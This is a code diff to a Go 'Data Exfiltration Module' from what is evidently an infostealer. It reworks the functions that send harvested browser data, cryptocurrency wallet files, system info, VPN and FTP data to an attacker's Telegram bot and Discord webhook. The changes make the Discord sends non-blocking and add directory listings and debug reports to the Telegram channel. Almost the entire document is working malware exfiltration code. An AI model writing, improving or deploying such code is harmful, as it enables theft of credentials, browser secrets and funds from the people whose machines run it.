@@ -1,5 +1,5 @@
 // ============================================================
-// exfil.go - Data Exfiltration Module (COMPLETE)
+// exfil.go - Data Exfiltration Module (FIXED DISCORD TIMEOUT)
 // ============================================================
 package exfil
 
@@ -93,25 +93,14 @@ func SendTelegram(message string) bool {
 	}
 
 	log.Printf("📤 Sending to: %s", url)
-	
-	payloadStr := string(jsonData)
-	if len(payloadStr) > 200 {
-		log.Printf("📤 Payload: %s...", payloadStr[:200])
-	} else {
-		log.Printf("📤 Payload: %s", payloadStr)
-	}
 
-	client := &http.Client{Timeout: 15 * time.Second}
+	client := &http.Client{Timeout: 10 * time.Second}
 	resp, err := client.Post(url, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
 		log.Printf("❌ Failed to send Telegram message: %v", err)
 		return false
 	}
 	defer resp.Body.Close()
-
-	body, _ := ioutil.ReadAll(resp.Body)
-	log.Printf("📤 Response status: %d", resp.StatusCode)
-	log.Printf("📤 Response body: %s", string(body))
 
 	if resp.StatusCode != 200 {
 		log.Printf("❌ Telegram returned status: %d", resp.StatusCode)
@@ -137,32 +126,21 @@ func SendTelegramFile(filePath, caption string) bool {
 
 	log.Printf("📁 Sending file: %s (%d bytes)", filePath, len(fileData))
 
-	// For simplicity, send as base64 encoded message
-	message := fmt.Sprintf("📁 File: %s\nSize: %d bytes\n%s",
-		filePath, len(fileData), string(fileData))
-
-	if len(message) > 4000 {
-		message = fmt.Sprintf("📁 File: %s\nSize: %d bytes\n(truncated)",
-			filePath, len(fileData))
-	}
+	message := fmt.Sprintf("📁 File: %s\nSize: %d bytes\n(truncated for Telegram)",
+		filePath, len(fileData))
 
 	return SendTelegram(message)
 }
 
 // ============================================================
-// DISCORD FUNCTIONS
+// DISCORD FUNCTIONS (FIXED - NON-BLOCKING)
 // ============================================================
 
 // SendDiscord sends a message via Discord
 func SendDiscord(message string) bool {
 	log.Println("📤 SendDiscord called")
 	
-	if len(discordWebhook) > 30 {
-		log.Printf("   Discord webhook: %s...", discordWebhook[:30])
-	} else {
-		log.Printf("   Discord webhook: %s", discordWebhook)
-	}
-
+	// Check if Discord is configured
 	if discordWebhook == "" {
 		log.Println("⚠️ Discord not configured - webhook URL is empty")
 		return false
@@ -182,28 +160,38 @@ func SendDiscord(message string) bool {
 		return false
 	}
 
-	log.Printf("📤 Sending Discord payload: %s", string(jsonData)[:200])
-	log.Printf("📤 Discord webhook: %s", discordWebhook)
+	log.Printf("📤 Sending Discord message to: %s...", discordWebhook[:50])
 
-	client := &http.Client{Timeout: 15 * time.Second}
-	resp, err := client.Post(discordWebhook, "application/json", bytes.NewBuffer(jsonData))
-	if err != nil {
-		log.Printf("❌ Failed to send Discord message: %v", err)
+	// Use a channel to handle timeout
+	resultChan := make(chan bool, 1)
+	go func() {
+		client := &http.Client{Timeout: 5 * time.Second}
+		resp, err := client.Post(discordWebhook, "application/json", bytes.NewBuffer(jsonData))
+		if err != nil {
+			log.Printf("❌ Discord error: %v", err)
+			resultChan <- false
+			return
+		}
+		defer resp.Body.Close()
+		
+		if resp.StatusCode != 204 && resp.StatusCode != 200 {
+			log.Printf("❌ Discord returned status: %d", resp.StatusCode)
+			resultChan <- false
+			return
+		}
+		
+		log.Println("✅ Discord message sent successfully")
+		resultChan <- true
+	}()
+
+	// Wait for result with timeout
+	select {
+	case result := <-resultChan:
+		return result
+	case <-time.After(5 * time.Second):
+		log.Println("⚠️ Discord request timed out (5s)")
 		return false
 	}
-	defer resp.Body.Close()
-
-	body, _ := ioutil.ReadAll(resp.Body)
-	log.Printf("📤 Discord response status: %d", resp.StatusCode)
-	log.Printf("📤 Discord response body: %s", string(body))
-
-	if resp.StatusCode != 204 && resp.StatusCode != 200 {
-		log.Printf("❌ Discord returned status: %d", resp.StatusCode)
-		return false
-	}
-
-	log.Println("✅ Discord message sent successfully")
-	return true
 }
 
 // ============================================================
@@ -217,10 +205,10 @@ func SendHeartbeat(message string) bool {
 	// Try Telegram first
 	telegramResult := SendTelegram("📡 " + message)
 
-	// Try Discord as fallback
-	discordResult := SendDiscord("📡 " + message)
+	// Try Discord as fallback (non-blocking)
+	go SendDiscord("📡 " + message)
 
-	return telegramResult || discordResult
+	return telegramResult
 }
 
 // ============================================================
@@ -229,37 +217,46 @@ func SendHeartbeat(message string) bool {
 
 // CollectAndSend collects all extracted data and sends it
 func CollectAndSend() {
-	log.Println("📤 Collecting and sending exfil data...")
+	log.Println("📤 CollectAndSend called")
+	
+	SendTelegram("🔍 DEBUG: CollectAndSend function called")
 
 	if !IsInitialized() {
-		log.Println("⚠️ Exfil module not initialized! Run Init() first.")
-		
-		if len(botToken) > 5 {
-			log.Printf("   BotToken: %s...", botToken[:5])
-		} else {
-			log.Printf("   BotToken: %s", botToken)
-		}
-		log.Printf("   ChatID: %s", chatID)
+		log.Println("⚠️ Exfil module not initialized!")
+		SendTelegram("❌ Exfil module not initialized!")
 		return
 	}
 
-	// Send startup message
-	SendHeartbeat("📤 Starting data exfiltration...")
+	SendTelegram("🔍 DEBUG: Exfil module initialized, looking for files...")
 
 	// Get current directory
 	currentDir, _ := os.Getwd()
 	log.Printf("📁 Current directory: %s", currentDir)
+	SendTelegram(fmt.Sprintf("📁 Current directory: %s", currentDir))
 
-	// List all JSON files
-	files, err := filepath.Glob("*.json")
+	// List all files in current directory
+	files, err := ioutil.ReadDir(".")
 	if err != nil {
-		log.Printf("❌ Failed to list JSON files: %v", err)
+		log.Printf("❌ Failed to list files: %v", err)
+		SendTelegram(fmt.Sprintf("❌ Failed to list files: %v", err))
 		return
 	}
+	
+	fileList := "📁 Files in directory:\n"
+	fileCount := 0
+	for _, f := range files {
+		if !f.IsDir() {
+			fileList += fmt.Sprintf("  - %s (%d bytes)\n", f.Name(), f.Size())
+			fileCount++
+		}
+	}
+	if fileCount > 0 {
+		SendTelegram(fileList)
+	} else {
+		SendTelegram("📁 No files found in current directory")
+	}
 
-	log.Printf("📁 Found %d JSON files", len(files))
-
-	// Filter for relevant files
+	// Check for specific files
 	relevantFiles := []string{
 		"browser_data.json",
 		"system_info.json",
@@ -269,6 +266,7 @@ func CollectAndSend() {
 		"common_files.json",
 		"ftps.json",
 		"vpns.json",
+		"test.json",
 	}
 
 	foundFiles := 0
@@ -276,37 +274,27 @@ func CollectAndSend() {
 		if _, err := os.Stat(file); err == nil {
 			foundFiles++
 			log.Printf("📁 Found: %s", file)
+			SendTelegram(fmt.Sprintf("📁 Found: %s (%d bytes)", file, getFileSize(file)))
 
 			data, err := ioutil.ReadFile(file)
 			if err == nil {
 				if len(data) < 4000 {
-					// Send as text message
 					message := fmt.Sprintf("📁 %s:\n%s", file, string(data))
 					SendTelegram(message)
-					SendDiscord(message)
+					go SendDiscord(message)
 				} else {
-					// Send as file
-					SendTelegram(fmt.Sprintf("📁 %s: %d bytes (sent as file)", file, len(data)))
-					SendDiscord(fmt.Sprintf("📁 %s: %d bytes (sent as file)", file, len(data)))
+					SendTelegram(fmt.Sprintf("📁 %s: %d bytes (sending as file)", file, len(data)))
 					SendTelegramFile(file, "Extracted data")
 				}
 			}
-
 			time.Sleep(1 * time.Second)
 		}
 	}
 
-	// If no files found, send a status message
 	if foundFiles == 0 {
-		message := "⚠️ No data files found to exfiltrate.\n"
-		message += "Files checked:\n"
-		for _, file := range relevantFiles {
-			message += "  - " + file + "\n"
-		}
-		SendHeartbeat(message)
+		SendTelegram("⚠️ No data files found to exfiltrate.")
 	}
 
-	// Send summary
 	summary := fmt.Sprintf("✅ Exfil Complete\nFiles sent: %d\nTime: %s",
 		foundFiles, time.Now().Format("2006-01-02 15:04:05"))
 	SendHeartbeat(summary)
@@ -322,18 +310,20 @@ func CollectAndSend() {
 func SendBrowserData() bool {
 	log.Println("📤 Sending browser data...")
 	
+	SendTelegram("🔍 DEBUG: SendBrowserData called")
+	
 	browserData := browsers.FormatBrowserData()
 	
 	// Send formatted data
 	result1 := SendTelegram(browserData)
-	result2 := SendDiscord(browserData)
+	go SendDiscord(browserData)
 	
 	// Also send JSON file if it exists
 	if _, err := os.Stat("browser_data.json"); err == nil {
 		SendTelegramFile("browser_data.json", "Browser Data JSON")
 	}
 	
-	return result1 || result2
+	return result1
 }
 
 // ============================================================
@@ -344,8 +334,11 @@ func SendBrowserData() bool {
 func SendWalletData() bool {
 	log.Println("📤 Sending wallet data...")
 	
+	SendTelegram("🔍 DEBUG: SendWalletData called")
+	
 	if _, err := os.Stat("wallets.json"); err != nil {
 		log.Println("⚠️ No wallet data found")
+		SendTelegram("⚠️ No wallet data found")
 		return false
 	}
 	
@@ -358,7 +351,7 @@ func SendWalletData() bool {
 	if len(data) < 4000 {
 		message := fmt.Sprintf("💰 WALLET DATA:\n%s", string(data))
 		SendTelegram(message)
-		SendDiscord(message)
+		go SendDiscord(message)
 	} else {
 		SendTelegram("💰 Wallet data: " + fmt.Sprintf("%d bytes", len(data)))
 		SendTelegramFile("wallets.json", "Wallet Data")
@@ -375,8 +368,11 @@ func SendWalletData() bool {
 func SendSystemInfo() bool {
 	log.Println("📤 Sending system info...")
 	
+	SendTelegram("🔍 DEBUG: SendSystemInfo called")
+	
 	if _, err := os.Stat("system_info.json"); err != nil {
 		log.Println("⚠️ No system info found")
+		SendTelegram("⚠️ No system info found")
 		return false
 	}
 	
@@ -389,7 +385,7 @@ func SendSystemInfo() bool {
 	if len(data) < 4000 {
 		message := fmt.Sprintf("🖥️ SYSTEM INFO:\n%s", string(data))
 		SendTelegram(message)
-		SendDiscord(message)
+		go SendDiscord(message)
 	} else {
 		SendTelegram("🖥️ System info: " + fmt.Sprintf("%d bytes", len(data)))
 		SendTelegramFile("system_info.json", "System Info")
@@ -402,12 +398,22 @@ func SendSystemInfo() bool {
 // UTILITY FUNCTIONS
 // ============================================================
 
+// getFileSize returns the size of a file as a string
+func getFileSize(filePath string) int64 {
+	info, err := os.Stat(filePath)
+	if err != nil {
+		return 0
+	}
+	return info.Size()
+}
+
 // SendAllFiles sends all JSON files in the current directory
 func SendAllFiles() {
 	log.Println("📤 Sending all JSON files...")
 
 	if !IsInitialized() {
 		log.Println("⚠️ Exfil module not initialized!")
+		SendTelegram("❌ Exfil module not initialized!")
 		return
 	}
 
@@ -416,6 +422,8 @@ func SendAllFiles() {
 		log.Printf("❌ Failed to list JSON files: %v", err)
 		return
 	}
+
+	SendTelegram(fmt.Sprintf("📁 Found %d JSON files", len(files)))
 
 	for _, file := range files {
 		if _, err := os.Stat(file); err == nil {
@@ -436,8 +444,8 @@ func SendAllFiles() {
 // SendCustomMessage sends a custom message to both channels
 func SendCustomMessage(message string) bool {
 	telegramResult := SendTelegram(message)
-	discordResult := SendDiscord(message)
-	return telegramResult || discordResult
+	go SendDiscord(message)
+	return telegramResult
 }
 
 // GetStatus returns the current status of the exfil module
@@ -459,4 +467,9 @@ func maskString(s string) string {
 		return s[:10] + "..."
 	}
 	return s
+}
+
+// SendDebug sends a debug message
+func SendDebug(message string) bool {
+	return SendTelegram("🔍 DEBUG: " + message)
 }
